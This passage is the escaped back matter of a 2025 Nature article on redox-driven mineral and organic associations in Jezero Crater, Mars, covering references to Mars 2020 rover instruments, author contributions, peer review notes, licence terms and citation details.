      &lt;item&gt;
        &lt;p&gt;Des Marais, D. J. et al. The NASA astrobiology roadmap. Astrobiology 3, 219–235 (2003).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Gillen, C., Jeancolas, C., McMahon, S. &amp;amp; Vickers, P. The call for a new definition of biosignature. Astrobiology 23, 1228–1237 (2023).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Mustard, J. F. et al. Report of the Mars 2020 Science Definition Team (Mars Exploration Program Analysis Group, 2013).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Hamran, S.-E. et al. Radar Imager for Mars’ Subsurface Experiment—RIMFAX. Space Sci. Rev. 216, 128 (2020).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Allwood, A. C. et al. PIXL: Planetary Instrument for X-ray Lithochemistry. Space Sci. Rev. 216, 134 (2020).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Maurice, S. et al. The SuperCam instrument suite on the Mars 2020 rover: science objectives and mast-unit description. Space Sci. Rev. 217, 47 (2021).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Wiens, R. C. et al. The SuperCam instrument suite on the NASA Mars 2020 rover: body unit and combined system tests. Space Sci. Rev. 217, 4 (2021).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Bell, J. F. et al. The Mars 2020 Perseverance rover Mast Camera Zoom (Mastcam-Z) multispectral, stereoscopic imaging investigation. Space Sci. Rev. 217, 24 (2021).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Moeller, R. C. et al. The Sampling and Caching Subsystem (SCS) for the scientific exploration of Jezero Crater by the Mars 2020 Perseverance rover. Space Sci. Rev. 217, 5 (2020).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Sharma, S. et al. Diverse organic-mineral associations in Jezero Crater, Mars. Nature 619, 724–72 (2023).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Osterhout, J. T., Schopf, J. W., Kudryavtsev, A. B., Czaja, A. D. &amp;amp; Williford, K. H. Deep-UV Raman spectroscopy of carbonaceous Precambrian microfossils: insights into the search for past life on Mars. Astrobiology 22, 1239–1254 (2022).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Jakubek, R. S. et al. Spectral Background Calibration of Scanning Habitable Environments with Raman and Luminescence for Organics and Chemicals (SHERLOC) spectrometer onboard the rover enables identification of a ubiquitous Martian spectral component. Appl. Spectrosc. https://doi.org/10.1177/00037028241280081 (2024).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Heirwegh, C. M., Elam, W. T., O’Neil, L. P., Sinclair, K. P. &amp;amp; Das, A. The focused beam X-ray fluorescence elemental quantification software package PIQUANT. Spectrochim. Acta Part B 196, 106520 (2022).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Schmidt, M. E. et al. Diverse and highly differentiated lava suite in Jezero Crater, Mars: constraints on intracrustal magmatism revealed by Mars 2020 PIXL. Sci. Adv. 11, eadr2613 (2025).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Chadwick, O. A., Brimhall, G. H. &amp;amp; Hendricks, D. M. From a black to a gray box—a mass balance interpretation of pedogenesis. Geomorphology 3, 369–390 (1990).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Liu, Y. et al. An olivine cumulate outcrop on the floor of Jezero Crater, Mars. Science 377, 1513–151 (2022).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Fisher, R. A. Frequency distribution of the values of the correlation coefficient in samples from an indefinitely large population. Biometrika 10, 507–521 (1914).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Wright, A. P., Nemere, P., Galvin, A., Chau, D. H. &amp;amp; Davidoff, S. Lessons from the development of an anomaly detection interface on the Mars Perseverance Rover using the ISHMAP framework. In Proc. 28th International Conference on Intelligent User Interfaces 91–105 (Association for Computing Machinery, 2023).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Schurman, D. et al. PIXELATE: novel visualization and computational methods for the analysis of astrobiological spectroscopy data. In AbSciCon 2019, 401-8 (American Geophysical Union, 2019).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Davidoff, S. et al. PIXLISE spectroscopy analysis software: released versions for published analyses. OSF https://doi.org/10.17605/OSF.IO/URE2F (2024).&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Acknowledgements&lt;/head&gt;
    &lt;p&gt;We acknowledge the efforts of the Mars 2020 Science and Engineering Teams. This work was carried out by A.C.A., M.L.C., K.P.H., K.U., S.D., K.A.F., S.W.L., Y.L., K.M.S., L.A.W., C.M.H. and J.N.M. at the Jet Propulsion Laboratory, California Institute of Technology, under a contract with the National Aeronautics and Space Administration (80NM0018D0004).&lt;/p&gt;
    &lt;head rend="h2"&gt;Author information&lt;/head&gt;
    &lt;head rend="h3"&gt;Authors and Affiliations&lt;/head&gt;
    &lt;head rend="h3"&gt;Contributions&lt;/head&gt;
    &lt;p&gt;Conceptualization: A.C.A., S.B., A.B., A.P.B., K.A.F., D.T.F., B.G., S.G., K.P.H., J.A.H., M.S.R., E.S., M.E.S., M.D.S., D.L.S., K.M.S., M.M.T., A.H.T., K.U., R.C.W. and K.H.W. Methodology: J.F.B., O.B., R. Bhartia, E.A.C., D.T.F., B.G., S.-E.H., K.P.H., J.A.H., J.R.J., M.W.M.J., Y.L., L.M., L.P.O’N, M.S.R., P.R., E.S., A. Steele, M.M.T., K.U., S.J.V., L.A.W., B.P.W. and K.H.W. Software: S.D., D.T.F., T. Fouchet, S.-E.H., P.S.J., D.A.K., L.P.O’N., G.P., E.S., S. Sharma, M.M.T., K.U., S.J.V. and K.H.W. Validation: J.A.H., J.R.J., E.S., M.M.T., L.A.W. and K.H.W. Formal analysis: A.C.A., E.L.C., E.D., T. Fornaro, K.P.H., J.A.H., M.W.M.J., H.K., L.P.O’N., B.J.O., M.S.R., E.S., S. Siljeström, A. Steele, M.M.T., K.U., S.J.V. and K.H.W. Investigation: R. Barnes, A.B., P.B., K.B., S.B., O.B., R. Bhartia, T.B., A.J.B., A.P.B., G.C., E.L.C., E.C., E.A.C., A.C., E.D., K.A.F., D.T.F., T. Fornaro, T. Fouchet, B.G., S.G., S.-E.H., K.P.H., K.H.-L., J.A.H., J.R.J., A.J.J., M.W.M.J., P.S.J., L.C.K., H.K., T.V.K., D.A.K., S.W.L., A.Y.L., Y.L., J.N.M., L.M., N.M., J.A.M., J.M.-F., E.L.M., A.E.M., J.I.N., L.P.O’N., B.J.O., D.A.P., C.Q.-N., M.S.R., P.R., E.S., M.E.S., M.D.S., S. Sharma, D.L.S., K.L.S., S. Siljeström, J.I.S., K.M.S., A. Steele, M.M.T., A.H.T., K.U., S.J.V., L.A.W., B.P.W., R.C.W., K.H.W. and B.V.W. Resources: J.F.B., A.P.B., M.L.C., K.P.H., J.A.H., S.W.L. and D.A.P. Data curation: P.A.B., A.B., J.F.B., E.L.C., S.D., B.G., C.M.H., J.E.H., H.K., J.N.M., J.A.M., E.L.M., G.P., A.C.P., N.P., M.S.R., A.H.T., K.U., S.J.V., B.V.W and Z.U.W. Writing—original draft: A.C.A., E.L.C., E.D., F.G., S.G., J.A.H., M.S.R., L.A.W. and R.C.W. Writing—review and editing: R. Barnes, P.B., K.B., S.B., O.B., R. Bhartia, T.B., A.B., A.P.B., M.L.C., G.C., E.L.C., E.C., E.A.C., E.D., A.G.F., D.T.F., T. Fornaro, T. Fouchet, F.G., S.G., K.P.H., E.M.H., C.D.K.H., K.H.-L., J.A.H., J.R.J., A.J.J., M.W.M.J., P.S.J., L.C.K., T.V.K., D.A.K., A.Y.L., Y.L., L.M., N.M., J.A.M., J.M.-F., F.M.M., E.L.M., A.E.M., J.I.N., L.P.O’N., B.J.O., C.Q.-N., M.S.R., P.R., M.E.S., M.D.S., S. Sharma, D.L.S., K.L.S., S. Siljeström, J.I.S., A. Srivastava, K.M.S., A. Steele, M.M.T., N.J.T., A.H.T., K.U., S.J.V., L.A.W., B.P.W., R.C.W. and K.H.W. Visualization: R. Barnes, P.A.B., A.B., J.F.B., E.L.C., E.C., S.D., E.D., B.G., S.-E.H., J.E.H., J.A.H., J.R.J., M.W.M.J., P.S.J., J.L.J., D.A.K., J.N.M., J.M.-F., G.P., A.C.P., N.P., M.S.R., P.R., M.M.T., K.U. and S.J.V. Supervision: J.F.B., M.L.C., A.C., K.A.F., S.G., K.P.H., J.A.H., J.R.J., J.L.J., S.W.L., J.N.M., M.D.S., K.M.S., M.M.T., K.U. and R.C.W. Project administration: J.F.B., M.L.C., A.C., K.A.F., T. Fouchet, S.-E.H., K.P.H., J.A.H., J.L.J., L.C.K., S.W.L., J.N.M., D.A.P., M.D.S., K.M.S. and R.C.W. Funding acquisition: A.C.A., J.F.B., M.L.C., T. Fouchet, S.G., K.P.H., J.A.H., J.L.J., S.W.L., D.A.P. and R.C.W.&lt;/p&gt;
    &lt;head rend="h3"&gt;Corresponding author&lt;/head&gt;
    &lt;head rend="h2"&gt;Ethics declarations&lt;/head&gt;
    &lt;head rend="h3"&gt;Competing interests&lt;/head&gt;
    &lt;p&gt;The authors declare no competing interests.&lt;/p&gt;
    &lt;head rend="h2"&gt;Peer review&lt;/head&gt;
    &lt;head rend="h3"&gt;Peer review information&lt;/head&gt;
    &lt;p&gt;Nature thanks Janice Bishop, Aude Picard and the other, anonymous, reviewer(s) for their contribution to the peer review of this work. Peer reviewer reports are available.&lt;/p&gt;
    &lt;head rend="h2"&gt;Additional information&lt;/head&gt;
    &lt;p&gt;Publisher’s note Springer Nature remains neutral with regard to jurisdictional claims in published maps and institutional affiliations.&lt;/p&gt;
    &lt;head rend="h2"&gt;Supplementary information&lt;/head&gt;
    &lt;head rend="h3"&gt;Supplementary Information&lt;/head&gt;
    &lt;p&gt;This file contains Supplementary Text, Tables 1–3, Figs. 1–26 and References.&lt;/p&gt;
    &lt;head rend="h3"&gt;Supplementary Data&lt;/head&gt;
    &lt;p&gt;File containing tabulated PIXL XRF data for rock bulk and region of interest compositions, as well as data used in the construction of Supplementary Figs. 21f–h and 26.&lt;/p&gt;
    &lt;head rend="h2"&gt;Rights and permissions&lt;/head&gt;
    &lt;p&gt;Open Access This article is licensed under a Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International License, which permits any non-commercial use, sharing, distribution and reproduction in any medium or format, as long as you give appropriate credit to the original author(s) and the source, provide a link to the Creative Commons licence, and indicate if you modified the licensed material. You do not have permission under this licence to share adapted material derived from this article or parts of it. The images or other third party material in this article are included in the article’s Creative Commons licence, unless indicated otherwise in a credit line to the material. If material is not included in the article’s Creative Commons licence and your intended use is not permitted by statutory regulation or exceeds the permitted use, you will need to obtain permission directly from the copyright holder. To view a copy of this licence, visit http://creativecommons.org/licenses/by-nc-nd/4.0/.&lt;/p&gt;
    &lt;head rend="h2"&gt;About this article&lt;/head&gt;
    &lt;head rend="h3"&gt;Cite this article&lt;/head&gt;
    &lt;p&gt;Hurowitz, J.A., Tice, M.M., Allwood, A.C. et al. Redox-driven mineral and organic associations in Jezero Crater, Mars. Nature 645, 332–340 (2025). https://doi.org/10.1038/s41586-025-09413-0&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Received:&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Accepted:&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Published:&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Issue Date:&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;DOI: https://doi.org/10.1038/s41586-025-09413-0&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.nature.com/articles/s41586-025-09413-0"/></entry></feed>